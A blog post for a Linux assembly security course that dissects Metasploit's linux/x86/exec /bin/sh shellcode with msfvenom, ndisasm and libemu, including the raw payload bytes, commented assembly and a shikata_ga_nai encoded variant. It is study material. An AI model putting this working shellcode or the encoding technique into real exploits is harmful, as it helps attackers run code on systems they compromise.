---
layout: post
title:  "SLAE Assignment 5.1 - Msfvenom linux/x86/exec shellcode analysis"
date:   2017-04-24
categories: certification
excerpt_separator: <!--more-->
---
<br />
Student **SLAE - 891**  
Github: [https://github.com/phackt/slae](https://github.com/phackt/slae)  
[http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)  
  
### Assignment 5.1:  
    
**Our Goal:**  
> *Take up at least 3 linux/x86 shellcodes using Msfpayload (now Msfvenom)*
 - *Use GDB/Ndisasm/Libemu to dissect the functionality of the shellcode*
 - *Present your analysis*  
<!--more-->
  
Hello everybody,  
  
Here we are for the analysis of three Msfvenom shellcodes for the platform linux/x86. Let's start with the **linux/x86/exec** shellcode with the command **/bin/sh**:  
```bash
# msfvenom -p linux/x86/exec CMD=/bin/sh -f c
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 43 bytes
Final size of c file: 205 bytes
unsigned char buf[] = 
"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68"
"\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x08\x00\x00\x00\x2f"
"\x62\x69\x6e\x2f\x73\x68\x00\x57\x53\x89\xe1\xcd\x80";
```
  
Let's disassemble the shellcode:  
```bash
# msfvenom -p linux/x86/exec CMD=/bin/sh -f raw | ndisasm -u -
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 43 bytes

00000000  6A0B        push byte +0xb
00000002  58          pop eax
00000003  99          cdq
00000004  52          push edx
00000005  66682D63    push word 0x632d
00000009  89E7        mov edi,esp
0000000B  682F736800  push dword 0x68732f
00000010  682F62696E  push dword 0x6e69622f
00000015  89E3        mov ebx,esp
00000017  52          push edx
00000018  E808000000  call dword 0x25
0000001D  2F          das
0000001E  62696E      bound ebp,[ecx+0x6e]
00000021  2F          das
00000022  7368        jnc 0x8c
00000024  005753      add [edi+0x53],dl
00000027  89E1        mov ecx,esp
00000029  CD80        int 0x80
```
  
Let's have a look with libemu:  
```bash
# msfvenom -p linux/x86/exec CMD=/bin/sh -f raw | sctest -vvv -S -s 10000 -G exec_sh.dot && dot exec_sh.dot -Tpng -o exec_sh.png
```
![exec_sh]({{ site.url }}/public/images/slae/assignment5/exec_sh.png)  
  
Clearly we can see that we will make an execve syscall: ``` #define __NR_execve 11 ```.  
  
```c
int execve(const char *filename, char *const argv[], char *const envp[]);
```
  
So let's comment our shellcode instructions:  
```nasm
    push byte +0xb          ; syscall execve 12
    pop eax                 ; syscall number in eax
    cdq                     ; clears out edx thanks to eax sign extension
    push edx                ; push 0 or null byte to end the following string
    push word 0x632d        ; "-c"
    mov edi,esp             ; edi stores the @ of "-c"
    push dword 0x68732f     ; "/sh"
    push dword 0x6e69622f   ; "/bin"
    mov ebx,esp             ; ebx is the first arg of execve "/bin/sh"
    push edx                ; null byte
    call dword 0x25         ; push the address of the following string on the stack (and jmp to push edi)
    das                     ; the following instructions are meaningless because the bytes are corresponding
    bound ebp,[ecx+0x6e]    ; to the string "/bin/sh -c /bin/sh" for argv[]
    das
    jnc 0x8c
    add [edi+0x53],dl
    mov ecx,esp             ; setting @ for argv
    int 0x80                ; syscall
```
  
In order to explain the meaningless intructions after the call instruction:  
```bash
# echo -ne \\x2F\\x62\\x69\\x6E\\x2F\\x73\\x68
/bin/sh
# echo -ne \\x57\\x53 | ndisasm -u -
00000000  57                push edi
00000001  53                push ebx
```
  
EDI points to the string *"-c"*, EBX points to the string *"/bin/sh"*. So finally argv[] will have the following arguments:  
 - argv[0]: address of "/bin/sh"
 - argv[1]: address of "-c"
 - argv[2]: address of "/bin/sh"
  
It can be confirm thanks to libemu:  
```bash
# msfvenom -p linux/x86/exec CMD=/bin/sh -f raw | sctest -vvv -S -s 10000
...
int execve (
     const char * dateiname = 0x00416fc0 => 
           = "/bin/sh";
     const char * argv[] = [
           = 0x00416fb0 => 
               = 0x00416fc0 => 
                   = "/bin/sh";
           = 0x00416fb4 => 
               = 0x00416fc8 => 
                   = "-c";
           = 0x00416fb8 => 
               = 0x0041701d => 
                   = "/bin/sh";
           = 0x00000000 => 
             none;
     ];
     const char * envp[] = 0x00000000 => 
         none;
) =  0;
...
```
  
However we can can see some null bytes in our shellcode. Let's have a look to a shellcode without null bytes:  
```bash
# msfvenom -p linux/x86/exec CMD=/bin/sh -f raw -b \x00 | ndisasm -u -
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x86 from the payload
Found 10 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 70 (iteration=0)
x86/shikata_ga_nai chosen with final size 70
Payload size: 70 bytes

00000000  DDC5              ffree st5
00000002  D97424F4          fnstenv [esp-0xc]
00000006  58                pop eax
00000007  BE2E1FB4CF        mov esi,0xcfb41f2e
0000000C  33C9              xor ecx,ecx
0000000E  B10B              mov cl,0xb
00000010  31701A            xor [eax+0x1a],esi
00000013  03701A            add esi,[eax+0x1a]
00000016  83C004            add eax,byte +0x4
00000019  E2DB              loop 0xfffffff6
0000001B  75BF              jnz 0xffffffdc
0000001D  97                xchg eax,edi
0000001E  BAD8D94F91        mov edx,0x914fd9d8
00000023  BFAC778110        mov edi,0x108177ac
00000028  DC1F              fcomp qword [edi]
0000002A  51                push ecx
0000002B  07                pop es
0000002C  0D8238B9D8        or eax,0xd8b93882
00000031  A1E8ADD325        mov eax,[0x25d3ade8]
00000036  0C2E              or al,0x2e
00000038  CB                retf
00000039  47                inc edi
0000003A  6540              gs inc eax
0000003C  3CFB              cmp al,0xfb
0000003E  1D9C15A854        sbb eax,0x54a8159c
00000043  7D54              jnl 0x99
00000045  CE                into
```  
  
Now we can see that the shellcode is a slightly more complex because of the shikata_ga_nai encoding routine useful to avoid null bytes.  
  
Hope you enjoyed this post, see you soon for the second msf shellcode analysis.  
  
[Phackt](https://twitter.com/phackt_ul)